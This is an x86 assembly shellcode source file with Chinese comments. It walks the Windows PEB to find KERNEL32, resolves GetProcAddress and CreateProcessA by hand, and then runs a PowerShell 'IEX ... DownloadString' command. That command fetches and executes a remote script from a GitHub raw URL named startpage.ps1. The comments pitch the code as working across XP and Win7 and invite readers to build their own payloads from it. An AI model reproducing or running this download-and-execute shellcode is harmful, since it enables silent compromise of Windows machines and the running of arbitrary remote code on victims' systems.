.386
.model flat,stdcall
option casemap:none
include windows.inc


.code;代码段
start:;好了我们开始我们的Shellcode代码
push ebp
sub esp,100
mov ebp,esp;预留函数地址空间下面我们把动态库基址和函数地址都存在ebp里面
;*********************************************************************************
assume fs:nothing
xor   ecx,ecx
mov eax,fs:[30h]
mov eax,[eax + 0ch]
mov esi,[eax + 1ch]
next_module: 
        mov   eax,[esi+08h]
        mov   edi,[esi+20h]
        mov   esi,[esi]
        cmp  [edi+12*2],cx
jnz  next_module;这里是实现搜索KERNEL32基址的
MOV [ebp+40],eax;把得到的KERNEL32基址保存倒[ebp+40] ,xp  win7 64位通杀
mov edx,eax 
;********************************************************************************* 
   
    mov eax,(IMAGE_DOS_HEADER ptr [edx]).e_lfanew    ;得到IMAGE_NT_HEADERS地址
    mov eax,(IMAGE_NT_HEADERS ptr [edx + eax]).OptionalHeader.DataDirectory.VirtualAddress    ;得到导出表RVA
    add eax,edx                    ;导出表在内存的实际地址
    assume eax:ptr IMAGE_EXPORT_DIRECTORY
    mov esi,[eax].AddressOfNames
    add esi,edx
    push 00007373h    ;在堆栈中构造GetProcAddress
    push 65726464h
    push 41636F72h
    push 50746547h
    push esp
    xor ecx,ecx
    .repeat
        mov edi,[esi]
        add edi,edx
        push esi
        mov esi,[esp + 4]
        push ecx
        mov ecx,0fh ;GetProcAddress的长度，包括0
        repz cmpsb
        .break .if ZERO? ;找到跳出循环
        pop ecx
        pop esi
        add esi,4
        inc ecx
    .until ecx >= [eax].NumberOfNames
    pop ecx
    mov esi,[eax].AddressOfNameOrdinals
    add esi,edx
    movzx ecx,word ptr [esi + ecx*2] ;取出序数
    mov esi,[eax].AddressOfFunctions
    assume eax:nothing
    add esi,edx
    mov esi,[esi + ecx*4]
    add esi,edx 
    mov  edi,edx;搜索得到GetProcAddress地址
    MOV [ebp+45],esi;把得到的GetProcAddress函数地址保存倒[ebp+45]
;********************************************************************************* 

;********************************************************************************* 
;我就编写倒这里了 用这个方法可以编写你想要的程序了
;这里我们还是用同样的方法得到ExitProcess函数
call _createprocess
    db 'CreateProcessA',0
_createprocess:         
       pop ebx
       push ebx
       push [ebp+40]
       call dword ptr [ebp+45]       
       push ebp
       push ebp
       push 0
       push 0
       push 0
       push 0
       push 0
       push 0              
       call _powershell
      db "powershell IEX (new-object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Voraka/Stape/master/startpage.ps1');",0
_powershell:
       push 0
       call eax
       nop
call _exitprocess
    db 'ExitProcess',0
_exitprocess:  
	push [ebp+40]
	call dword ptr [ebp+45]
	nop
	nop
	nop
	nop
	nop
	push 0
	call eax 
;这段我就不注释了 给你们自己研究！
;********************************************************************************* 
end start